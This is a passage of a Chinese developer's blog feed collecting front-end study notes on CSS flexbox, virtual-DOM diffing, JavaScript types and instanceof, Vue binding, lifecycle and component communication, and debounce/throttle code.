    <content type="html"><![CDATA[<h1 id="flex-布局🧚‍♀️"><a href="#flex-布局🧚‍♀️" class="headerlink" title="flex 布局🧚‍♀️"></a>flex 布局🧚‍♀️</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Flex 是 Flexible Box 的缩写，意为”弹性布局”，用来为盒状模型提供最大的灵活性。</p><p>任何一个容器都可以指定为 Flex 布局。</p><p><img src="C:/Users/l%27x/AppData/Roaming/Typora/typora-user-images/image-20211008161112518.png" alt="image-20211008161112518"></p><h2 id="常用属性"><a href="#常用属性" class="headerlink" title="常用属性"></a>常用属性</h2><ul><li>flex-direction</li><li>flex-wrap</li><li>flex-flow (<code>flex-flow</code>属性是<code>flex-direction</code>属性和<code>flex-wrap</code>属性的简写形式)</li><li>justify-content</li><li>align-items</li><li>align-content</li></ul><h3 id="flex-direction属性"><a href="#flex-direction属性" class="headerlink" title="flex-direction属性"></a>flex-direction属性</h3><p><code>flex-direction</code>属性决定主轴的方向（即项目的排列方向）。</p><blockquote><p>row（默认值）：主轴为水平方向，起点在左端。</p><p>row-reverse：主轴为水平方向，起点在右端。<br>column：主轴为垂直方向，起点在上沿。<br>column-reverse：主轴为垂直方向，起点在下沿。</p></blockquote><h3 id="flex-wrap属性"><a href="#flex-wrap属性" class="headerlink" title="flex-wrap属性"></a>flex-wrap属性</h3><p>默认情况下，项目都排在一条线（又称”轴线”）上。<code>flex-wrap</code>属性定义，如果一条轴线排不下，如何换行。</p><blockquote><p><code>nowrap</code>（默认）：不换行。</p><p><code>wrap</code>：换行，第一行在上方。</p><p><code>wrap-reverse</code>：换行，第一行在下方。</p></blockquote><h3 id="flex-flow"><a href="#flex-flow" class="headerlink" title="flex-flow"></a>flex-flow</h3><p><code>flex-flow</code>属性是<code>flex-direction</code>属性和<code>flex-wrap</code>属性的简写形式，默认值为<code>row nowrap</code>。</p><h3 id="justify-content属性"><a href="#justify-content属性" class="headerlink" title="justify-content属性"></a>justify-content属性</h3><p><code>justify-content</code>属性定义了项目在主轴上的对齐方式。</p><blockquote><p>flex-start（默认值）：左对齐</p><p>flex-end：右对齐<br>center： 居中<br>space-between：两端对齐，项目之间的间隔都相等。<br>space-around：每个项目两侧的间隔相等。所以，项目之间的间隔比项目与边框的间隔大一倍。</p></blockquote><h3 id="align-items属性"><a href="#align-items属性" class="headerlink" title="align-items属性"></a>align-items属性</h3><p><code>align-items</code>属性定义项目在交叉轴上如何对齐。</p><blockquote><p>flex-start：交叉轴的起点对齐。</p><p>flex-end：交叉轴的终点对齐。<br>center：交叉轴的中点对齐。<br>baseline: 项目的第一行文字的基线对齐。<br>stretch（默认值）：如果项目未设置高度或设为auto，将占满整个容器的高度。</p></blockquote><h3 id="align-content属性"><a href="#align-content属性" class="headerlink" title="align-content属性"></a>align-content属性</h3><p><code>align-content</code>属性定义了多根轴线的对齐方式。如果项目只有一根轴线，该属性不起作用。</p><blockquote><p>flex-start：与交叉轴的起点对齐。</p><p>flex-end：与交叉轴的终点对齐。<br>center：与交叉轴的中点对齐。<br>space-between：与交叉轴两端对齐，轴线之间的间隔平均分布。<br>space-around：每根轴线两侧的间隔都相等。所以，轴线之间的间隔比轴线与边框的间隔大一倍。<br>stretch（默认值）：轴线占满整个交叉轴。</p></blockquote><p>整理原文：阮一峰博客    </p>]]></content>
    
    
    <categories>
      
      <category>css</category>
      
    </categories>
    
    
    <tags>
      
      <tag>css</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>异步编程</title>
    <link href="/hexo_blog/2021/10/06/diff%E7%AE%97%E6%B3%95/"/>
    <url>/hexo_blog/2021/10/06/diff%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="diff算法"><a href="#diff算法" class="headerlink" title="diff算法"></a>diff算法</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>两个树的完全 diff 算法的时间复杂度为 O(n^3) ，但是在前端中，我们很少会跨层级的移动元素，所以我们只需要比较同一层级的元素进行比较，这样就可以将算法的时间复杂度降低为 O(n)。</p><p>算法首先会对新旧两棵树进行一个深度优先的遍历，这样每个节点都会有一个序号。在深度遍历的时候，每遍历到一个节点，我们就将这个节点和新的树中的节点进行比较，如果有差异，则将这个差异记录到一个对象中。</p><p>在对列表元素进行对比的时候，由于 TagName 是重复的，所以我们不能使用这个来对比。我们需要给每一个子节点加上一个 key，列表对比的时候使用 key 来进行比较，这样我们才能够复用老的 DOM 树上的节点。</p><h2 id="diff算法-1"><a href="#diff算法-1" class="headerlink" title="diff算法"></a>diff算法</h2><ul><li>把树形结构按照层级分解，只比较同级元素。</li><li>给列表结构的每个单元添加唯一的<code>key</code>属性，方便比较。</li><li><code>React</code> 只会匹配相同 <code>class</code> 的 <code>component</code>（这里面的<code>class</code>指的是组件的名字）</li><li>合并操作，调用 <code>component</code> 的 <code>setState</code> 方法的时候, <code>React</code> 将其标记为 - <code>dirty</code>.到每一个事件循环结束, <code>React</code> 检查所有标记 <code>dirty</code>的 <code>component</code>重新绘制.</li><li>选择性子树渲染。开发人员可以重写<code>shouldComponentUpdate</code>提高<code>diff</code>的性能</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>js基本数据内型</title>
    <link href="/hexo_blog/2021/10/06/js%20%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
    <url>/hexo_blog/2021/10/06/js%20%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="js基本数据内型"><a href="#js基本数据内型" class="headerlink" title="js基本数据内型"></a>js基本数据内型</h1><h2 id="基本内型"><a href="#基本内型" class="headerlink" title="基本内型"></a>基本内型</h2><p>基本数据类型：<code>undefined</code>、<code>null</code>、<code>boolean</code>、<code>number</code>、<code>string</code>、<code>symbol</code></p><h2 id="引用内型"><a href="#引用内型" class="headerlink" title="引用内型"></a>引用内型</h2><p>引用数据类型：<code>object</code>、<code>array</code>、<code>function</code></p><h2 id="内置对象"><a href="#内置对象" class="headerlink" title="内置对象"></a>内置对象</h2><ul><li><code>Object</code> 是 <code>JavaScript</code> 中所有对象的父对象</li><li>数据封装类对象：<code>Object</code>、<code>Array</code>、<code>Boolean</code>、<code>Number</code> 和 <code>String</code></li><li>其他对象：<code>Function</code>、<code>Arguments</code>、<code>Math</code>、<code>Date</code>、<code>RegExp</code>、<code>Error</code></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>双向绑定</title>
    <link href="/hexo_blog/2021/10/06/%E6%95%B0%E6%8D%AE%E5%8F%8C%E5%90%91%E7%BB%91%E5%AE%9A/"/>
    <url>/hexo_blog/2021/10/06/%E6%95%B0%E6%8D%AE%E5%8F%8C%E5%90%91%E7%BB%91%E5%AE%9A/</url>
    
    <content type="html"><![CDATA[<h1 id="双向绑定"><a href="#双向绑定" class="headerlink" title="双向绑定"></a>双向绑定</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Vue实现数据双向绑定的原理：Object.defineProperty()</p><h2 id="发布订阅模式"><a href="#发布订阅模式" class="headerlink" title="发布订阅模式"></a>发布订阅模式</h2><p>发布订阅者模式，一种对象间一对多的依赖关系，但一个对象的状态发生改变时，所依赖它的对象都将得到状态改变的通知。</p><p>在发布订阅模式中，添加了一个事件通道，发布者和订阅者不在直接进行交互。所有的注册，解绑，发布都是通过 <code>Event Channel</code> 来实现的。也就是说我们把观察者模式中的逻辑抽象出来，形成了一个单独的模块。</p><p>现在整个的逻辑大概是这样：我们不再是对某个对象进行监听，而是告诉 <code>Event Channel</code>，我想要注册一个名叫 <code>type</code> 的事件，当这个事件触发以后，请执行 <code>fn</code> 函数。事件中心将我的注册信息进行保存。当有一个模块想要执行订阅者的对应方法的时候，只要告诉 <code>Event Channel</code>，我想要触发 <code>type</code> 事件，并且传入参数 <code>arg1, arg2 ...</code>。<code>Event Channel</code> 就会找到对应事件对应的 <code>fn</code> 传入 <code>arg1, arg2 ...</code> 并执行。</p><p>场景模拟：</p><p>订阅者就像是顾客，到老板那里去购买商品，遇到没有货，就给老板一个订单，若货到了发消息给顾客</p><img src="../../../../../hexo/themes/fluid/source/img/tag1.png" style="zoom: 25%;" /><h2 id="双向绑定-1"><a href="#双向绑定-1" class="headerlink" title="双向绑定"></a>双向绑定</h2><ul><li><code>vue</code>实现数据双向绑定主要是：采用数据劫持结合发布者-订阅者模式的方式，通过 <code>Object.defineProperty()</code> 来劫持各个属性的<code>setter</code>，<code>getter</code>，在数据变动时发布消息给订阅者，触发相应监听回调。当把一个普通 <code>Javascript</code> 对象传给 Vue 实例来作为它的 <code>data</code> 选项时，Vue 将遍历它的属性，用 <code>Object.defineProperty()</code> 将它们转为 <code>getter/setter</code>。用户看不到 <code>getter/setter</code>，但是在内部它们让 <code>Vue</code>追踪依赖，在属性被访问和修改时通知变化。</li><li>vue的数据双向绑定 将<code>MVVM</code>作为数据绑定的入口，整合<code>Observer</code>，<code>Compile</code>和<code>Watcher</code>三者，通过<code>Observer</code>来监听自己的<code>model</code>的数据变化，通过<code>Compile</code>来解析编译模板指令（<code>vue</code>中是用来解析 <code>&#123;&#123;&#125;&#125;</code>），最终利用<code>watcher</code>搭起<code>observer</code>和<code>Compile</code>之间的通信桥梁，达到数据变化 —&gt;视图更新；视图交互变化（<code>input</code>）—&gt;数据<code>model</code>变更双向绑定效果。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>异步编程</title>
    <link href="/hexo_blog/2021/10/06/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/"/>
    <url>/hexo_blog/2021/10/06/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="vue生命周期"><a href="#vue生命周期" class="headerlink" title="vue生命周期"></a>vue生命周期</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Vue 实例有一个完整的生命周期，也就是从开始创建、初始化数据、编译模版、挂载Dom -&gt; 渲染、更新 -&gt; 渲染、卸载等一系列过程，我们称这是Vue的生命周期</p><p><img src="http://poetries1.gitee.io/img-repo/2020/07/61.png" alt="img"></p><h2 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h2><h3 id="beforeCreate"><a href="#beforeCreate" class="headerlink" title="beforeCreate"></a>beforeCreate</h3><p>实例初始化之后调用beforeCreate，此时的数据观察和事件配置都没好准备好此时的实例中的data和el还是undefined,不可用的。</p><h3 id="created"><a href="#created" class="headerlink" title="created"></a>created</h3><p>在实例创建完成后立即调用created,此时，我们能读取到数据data的值，但是dom还没生成，所以属性el还不存在，输出$data为一个Object对象，而$el的值为undefined。</p><h3 id="beforeMount"><a href="#beforeMount" class="headerlink" title="beforeMount"></a>beforeMount</h3><p>在挂载开始之前被调用,上一个阶段我们知道dom还没生成，属性el还为undefined，那么，此阶段为即将挂载,此时的$el不再是undefined，而是成功关联到我们指定的dom节点<div id="app"></div>，但此时还没有被成功地渲染成我们data中的数据。</p><h3 id="mounted"><a href="#mounted" class="headerlink" title="mounted"></a>mounted</h3><p>挂载完毕后调用mounted，到了这个阶段，数据就会被成功渲染出来,此时打印属性el，我们看到已经成功渲染成我们data.name的值</p><h3 id="beforeUpdate"><a href="#beforeUpdate" class="headerlink" title="beforeUpdate"></a>beforeUpdate</h3><p>我们知道，当修改vue实例的data时，vue就会自动帮我们更新渲染视图，在这个过程中，vue提供了beforeUpdate的钩子给我们，在检测到我们要修改数据的时候，更新渲染视图之前就会触发钩子beforeUpdate。</p><p>dada值已经改变，但是视图值没有改变</p><h3 id="Update"><a href="#Update" class="headerlink" title="Update"></a>Update</h3><p>在更新渲染视图之后调用updated,此时再读取视图上的内容，已经是最新的内容，此刻视图已经更新</p><h3 id="beforeDestroy"><a href="#beforeDestroy" class="headerlink" title="beforeDestroy"></a>beforeDestroy</h3><p>调用实例的destroy( )方法可以销毁当前的组件，在销毁前，会触发beforeDestroy钩子。</p><h3 id="destroyed"><a href="#destroyed" class="headerlink" title="destroyed"></a>destroyed</h3><p>成功销毁之后，会触发destroyed钩子，此时该实例与其他实例的关联已经被清除，它与视图之间也被解绑。</p><h3 id="activated"><a href="#activated" class="headerlink" title="activated"></a>activated</h3><p>keep-alive组件被激活时调用。</p><h3 id="deactivated"><a href="#deactivated" class="headerlink" title="deactivated"></a>deactivated</h3><p>keep-alive 组件停用时调用。</p><h2 id="第一次页面加载会触发哪几个钩子？"><a href="#第一次页面加载会触发哪几个钩子？" class="headerlink" title="第一次页面加载会触发哪几个钩子？"></a>第一次页面加载会触发哪几个钩子？</h2><h5 id="beforeCreate、created、beforeMount、mounted"><a href="#beforeCreate、created、beforeMount、mounted" class="headerlink" title="beforeCreate、created、beforeMount、mounted"></a><code>beforeCreate</code>、<code>created</code>、<code>beforeMount</code>、<code>mounted</code></h5><h2 id="DOM-渲染在哪个周期中就已经完成？"><a href="#DOM-渲染在哪个周期中就已经完成？" class="headerlink" title="DOM 渲染在哪个周期中就已经完成？"></a>DOM 渲染在哪个周期中就已经完成？</h2><h5 id="mounted-1"><a href="#mounted-1" class="headerlink" title="mounted"></a><code>mounted</code></h5><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>beforeCreate()</strong></p><p>在实例初始化之后调用，数据观察和事件配置都没好准备好。</p><p><strong>created()</strong></p><p>在实例创建完成后被调用，实例已完成数据观测 (data observer) 和 event/watcher 事件的配置，但是挂载元素还未生成。</p><p><strong>beforeMount()</strong></p><p>在挂载开始之前被调用，挂载元素已成功关联到指定的dom节点，还没有渲染data中的数据。</p><p><strong>mounted()</strong></p><p>挂在完毕之后调用，数据被渲染出来。</p><p><strong>beforeUpdate()</strong></p><p>数据更新前调用，此时视图里还是更新前的数据。</p><p><strong>updated()</strong></p><p>数据更新后调用，此时视图里是更新后的数据。</p><p><strong>beforeDestroy()</strong></p><p>在开始销毁实例时调用。</p><p><strong>destroyed()</strong></p><p>在实例销毁后调用，此时该实例与其他实例的关联已经被清除，它与视图之间也被解绑。</p><p><strong>actived()</strong></p><p>在keep-alive组件被激活前中调用。</p><p><strong>deactived()</strong></p><p>在keep-alive组件被停用后调用。</p>]]></content>
    
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>组件通信</title>
    <link href="/hexo_blog/2021/10/06/%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1/"/>
    <url>/hexo_blog/2021/10/06/%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="组件通信-key"><a href="#组件通信-key" class="headerlink" title="组件通信 :key:"></a>组件通信 :key:</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>组件化的使用，使得我们常常需要在组件之前传递数据</p><h2 id="（1）父子组件间通信"><a href="#（1）父子组件间通信" class="headerlink" title="（1）父子组件间通信"></a>（1）父子组件间通信</h2><p>第一种方法是子组件通过 props 属性来接受父组件的数据，然后父组件在子组件上注册监听事件，子组件通过 emit 触发事<br>件来向父组件发送数据。</p><p>第二种是通过 ref 属性给子组件设置一个名字。父组件通过 $refs 组件名来获得子组件，子组件通过 $parent 获得父组<br>件，这样也可以实现通信。</p><p>第三种是使用 provider/inject，在父组件中通过 provider 提供变量，在子组件中通过 inject 来将变量注入到组件<br>中。不论子组件有多深，只要调用了 inject 那么就可以注入 provider 中的数据。</p><h2 id="（2）兄弟组件间通信"><a href="#（2）兄弟组件间通信" class="headerlink" title="（2）兄弟组件间通信"></a>（2）兄弟组件间通信</h2><p>第一种是使用 eventBus 的方法，它的本质是通过创建一个空的 Vue 实例来作为消息传递的对象，通信的组件引入这个实<br>例，通信的组件通过在这个实例上监听和触发事件，来实现消息的传递。</p><p>第二种是通过 $parent.$refs 来获取到兄弟组件，也可以进行通信。</p><h2 id="（3）任意组件之间"><a href="#（3）任意组件之间" class="headerlink" title="（3）任意组件之间"></a>（3）任意组件之间</h2><p>使用 eventBus ，其实就是创建一个事件中心，相当于中转站，可以用它来传递事件和接收事件。</p><p>如果业务逻辑复杂，很多组件之间需要同时处理一些公共的数据，这个时候采用上面这一些方法可能不利于项目的维护。这个时候<br>可以使用 vuex ，vuex 的思想就是将这一些公共的数据抽离出来，将它作为一个全局的变量来管理，然后其他组件就可以对这个<br>公共数据进行读写操作，这样达到了解耦的目的。</p>]]></content>
    
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>节流防抖🗽</title>
    <link href="/hexo_blog/2021/10/03/%E8%8A%82%E6%B5%81%E9%98%B2%E6%8A%96/"/>
    <url>/hexo_blog/2021/10/03/%E8%8A%82%E6%B5%81%E9%98%B2%E6%8A%96/</url>
    
    <content type="html"><![CDATA[<h3 id="节流防抖🗽"><a href="#节流防抖🗽" class="headerlink" title="节流防抖🗽"></a>节流防抖🗽</h3><ul><li><p>定义🎉🎉🎉：</p><ul><li><strong>防抖：</strong>在任务高频率触发时，只有触发间隔超过制定间隔的任务才会执行。即一个动作连续触发则只执行最后一次。防抖的原理则是不管你在一段时间内如何不停的触发事件，只要设置了防抖，则只在触发n秒后才执行。如果我们在一个事件触发的n秒内又触发了相同的事件，那我们便以新的事件时间为标准，n秒之后再执行。</li></ul></li></ul><div class="hljs code-wrapper"><pre><code><pre><code class="hljs js"><span class="hljs-keyword">let</span> timer = flase;<span class="hljs-built_in">document</span>.addEventListener(<span class="hljs-string">&#x27;scroll&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;  <span class="hljs-built_in">clearTimeout</span>(timer); <span class="hljs-comment">// 清除未执行的定时器（如果之前已经触发过不到300毫秒又触发了一次则清除之前的）重置回初始化状态</span>  timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;函数防抖&quot;</span>)  &#125;, <span class="hljs-number">300</span>)&#125;)</code></pre></div></code></pre><ul><li><p><strong>节流：</strong>在制定间隔内任务只执行1次。节流的原理是不管你在一段时间内如何不停地触发事件，只要设置了节流，就会每隔一段时间执行一次。</p><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">let</span> canRun = <span class="hljs-literal">true</span>;<span class="hljs-built_in">document</span>.addEventListener(<span class="hljs-string">&#x27;scroll&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;  <span class="hljs-keyword">if</span> (!canRun) <span class="hljs-keyword">return</span>;  canRun = <span class="hljs-literal">false</span>;  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;函数节流&#x27;</span>)    canRun = <span class="hljs-literal">true</span>  &#125;, <span class="hljs-number">300</span>)&#125;)</code></pre></div></li></ul><div class="hljs code-wrapper"><pre><code>&lt;img src=&quot;C:\Users\l&#39;x\AppData\Roaming\Typora\typora-user-images\image-20210521162630790.png&quot; alt=&quot;image-20210521162630790&quot; style=&quot;zoom:50%;&quot; /&gt;</code></pre></div><h3 id="原理📣"><a href="#原理📣" class="headerlink" title="原理📣"></a>原理📣</h3><blockquote><p>防抖函数原理：在事件被触发n秒后再执行回调，如果在这n秒内又被触发，则重新计时</p><p>防抖动和节流本质是不一样的。防抖动是将多次执行变为最后一次执行，节流是将多次执行变成每隔一段时间执行</p></blockquote><blockquote><p>如： 像仿百度搜索，就应该用防抖，当我连续不断输入时，不会发送请求；当我一段时间内不输入了，才会发送一次请求；如果小于这段时间继续输入的话，时间会重新计算，也不会发送请求。</p></blockquote><p>  <strong>手写简化版🚔</strong></p>  <div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-comment">// func是用户传入需要防抖的函数</span><span class="hljs-comment">// wait是等待时间</span><span class="hljs-keyword">const</span> debounce = <span class="hljs-function">(<span class="hljs-params">func, wait = <span class="hljs-number">50</span></span>) =&gt;</span> &#123;  <span class="hljs-comment">// 缓存一个定时器id</span>  <span class="hljs-keyword">let</span> timer = <span class="hljs-number">0</span>  <span class="hljs-comment">// 这里返回的函数是每次用户实际调用的防抖函数</span>  <span class="hljs-comment">// 如果已经设定过定时器了就清空上一次的定时器</span>  <span class="hljs-comment">// 开始一个新的定时器，延迟执行用户传入的方法</span>  <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">...args</span>) </span>&#123;    <span class="hljs-keyword">if</span> (timer) <span class="hljs-built_in">clearTimeout</span>(timer)    timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;      func.apply(<span class="hljs-built_in">this</span>, args)    &#125;, wait)  &#125;&#125;</code></pre></div><blockquote><p>节流函数原理:规定在一个单位时间内，只能触发一次函数。如果这个单位时间内触发多次函数，只有一次生效</p></blockquote><blockquote><p>例:（连续不断动都需要调用时用，设一时间间隔），像dom的拖拽，如果用消抖的话，就会出现卡顿的感觉，因为只在停止的时候执行了一次，这个时候就应该用节流，在一定时间内多次执行，会流畅很多</p></blockquote><p>  <strong>手写简版🚔</strong></p>  <div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-comment">// func是用户传入需要防抖的函数</span><span class="hljs-comment">// wait是等待时间</span><span class="hljs-keyword">const</span> throttle = <span class="hljs-function">(<span class="hljs-params">func, wait = <span class="hljs-number">50</span></span>) =&gt;</span> &#123;  <span class="hljs-comment">// 上一次执行该函数的时间</span>  <span class="hljs-keyword">let</span> lastTime = <span class="hljs-number">0</span>  <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">...args</span>) </span>&#123;    <span class="hljs-comment">// 当前时间</span>    <span class="hljs-keyword">let</span> now = +<span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>()    <span class="hljs-comment">// 将当前时间和上一次执行函数时间对比</span>    <span class="hljs-comment">// 如果差值大于设置的等待时间就执行函数</span>    <span class="hljs-keyword">if</span> (now - lastTime &gt; wait) &#123;      lastTime = now      func.apply(<span class="hljs-built_in">this</span>, args)    &#125;  &#125;&#125;<span class="hljs-built_in">setInterval</span>(  throttle(<span class="hljs-function">() =&gt;</span> &#123;    <span class="hljs-built_in">console</span>.log(<span class="hljs-number">1</span>)  &#125;, <span class="hljs-number">500</span>),  <span class="hljs-number">1</span>)</code></pre></div><h3 id="函数防抖的应用场景🎟️"><a href="#函数防抖的应用场景🎟️" class="headerlink" title="函数防抖的应用场景🎟️"></a>函数防抖的应用场景🎟️</h3><p>  连续的事件，只需触发一次回调的场景有：</p><ul><li><p>搜索框搜索输入。只需用户最后一次输入完，再发送请求</p></li><li><p>手机号、邮箱验证输入检测</p></li><li><p>窗口大小Resize。只需窗口调整完成后，计算窗口大小。防止重复渲染。</p><h3 id="函数节流的应用场景🎟️"><a href="#函数节流的应用场景🎟️" class="headerlink" title="函数节流的应用场景🎟️"></a>函数节流的应用场景🎟️</h3><p>间隔一段时间执行一次回调的场景有：</p></li><li><p>滚动加载，加载更多或滚到底部监听</p></li><li><p>谷歌搜索框，搜索联想功能</p></li><li><p>高频点击提交，表单重复提交</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>js</category>
      
    </categories>
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>instanceof 的原理</title>
    <link href="/hexo_blog/2021/10/02/instanceof%20%E7%9A%84%E5%8E%9F%E7%90%86/"/>
    <url>/hexo_blog/2021/10/02/instanceof%20%E7%9A%84%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="instanceof-的原理"><a href="#instanceof-的原理" class="headerlink" title="instanceof 的原理"></a>instanceof 的原理</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>typeof和instanceof都用于检查数据的内型，但是和typeof的检测原理和适用范围却不一样，instanceof 可以正确的判断对象的类型，因为内部机制是通过判断对象的原型链中是不是能找到类型的 prototype</p><div class="hljs code-wrapper"><pre><code class="hljs awk">typeof <span class="hljs-number">1</span> <span class="hljs-regexp">//</span> <span class="hljs-string">&#x27;number&#x27;</span>typeof <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-regexp">//</span> <span class="hljs-string">&#x27;string&#x27;</span>typeof undefined <span class="hljs-regexp">//</span> <span class="hljs-string">&#x27;undefined&#x27;</span>typeof true <span class="hljs-regexp">//</span> <span class="hljs-string">&#x27;boolean&#x27;</span>typeof Symbol() <span class="hljs-regexp">//</span> <span class="hljs-string">&#x27;symbol&#x27;</span>typeof null <span class="hljs-regexp">//</span> <span class="hljs-string">&#x27;object&#x27;</span>typeof [] <span class="hljs-regexp">//</span> <span class="hljs-string">&#x27;object&#x27;</span>typeof &#123;&#125; <span class="hljs-regexp">//</span> <span class="hljs-string">&#x27;object&#x27;</span>typeof console <span class="hljs-regexp">//</span> <span class="hljs-string">&#x27;object&#x27;</span>typeof console.log <span class="hljs-regexp">//</span> <span class="hljs-string">&#x27;function&#x27;</span></code></pre></div><p>前6个都是基础数据类型。虽然<code>typeof null</code>为<code>object</code>，但这只是<code> JavaScript</code> 存在的一个悠久 <code>Bug</code>，不代表<code>null </code>就是引用数据类型，并且<code>null </code>本身也不是对象</p><p>所以，<code>null </code>在 <code>typeof </code>之后返回的是有问题的结果，不能作为判断<code>null</code>的方法。如果你需要在 <code>if</code> 语句中判断是否为 <code>null</code>，直接通过<code>===null</code>来判断就好</p><p>引用类型数据，用<code>typeof</code>来判断的话，除了<code>function</code>会被识别出来之外，其余的都输出<code>object</code></p><h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><ul><li><code>typeof</code>会返回一个变量的基本类型，<code>instanceof</code>返回的是一个布尔值</li><li><code>instanceof</code> 可以准确地判断复杂引用数据类型，但是不能正确判断基础数据类型</li><li>而<code> typeof</code> 也存在弊端，它虽然可以判断基础数据类型（<code>null</code> 除外），但是引用数据类型中，除了<code> function</code> 类型以外，其他的也无法判断</li></ul><h2 id="instanceof-原理"><a href="#instanceof-原理" class="headerlink" title="instanceof 原理"></a>instanceof 原理</h2><ul><li>首先获取类型的原型</li><li>然后获得对象的原型</li><li>然后一直循环判断对象的原型是否等于类型的原型，直到对象原型为 <code>null</code>，因为原型链最终为 <code>null</code></li></ul><h5 id="如果需要通用检测数据类型，可以采用Object-prototype-toString，调用该方法，统一返回格式“-object-Xxx-”-的字符串"><a href="#如果需要通用检测数据类型，可以采用Object-prototype-toString，调用该方法，统一返回格式“-object-Xxx-”-的字符串" class="headerlink" title="如果需要通用检测数据类型，可以采用Object.prototype.toString，调用该方法，统一返回格式“[object Xxx]” 的字符串"></a>如果需要通用检测数据类型，可以采用<code>Object.prototype.toString</code>，调用该方法，统一返回格式<code>“[object Xxx]” </code>的字符串</h5><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><div class="hljs code-wrapper"><pre><code class="hljs swift">function myInstanceof(<span class="hljs-keyword">left</span>, <span class="hljs-keyword">right</span>) &#123;  <span class="hljs-keyword">let</span> prototype = <span class="hljs-keyword">right</span>.prototype  <span class="hljs-keyword">left</span> = <span class="hljs-keyword">left</span>.__proto__  <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">left</span> === null || <span class="hljs-keyword">left</span> === undefined)      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>    <span class="hljs-keyword">if</span> (prototype === <span class="hljs-keyword">left</span>)      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>    <span class="hljs-keyword">left</span> = <span class="hljs-keyword">left</span>.__proto__  &#125;&#125;</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>js</category>
      
    </categories>
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网络知识点总结</title>
    <link href="/hexo_blog/2021/10/02/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <url>/hexo_blog/2021/10/02/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    
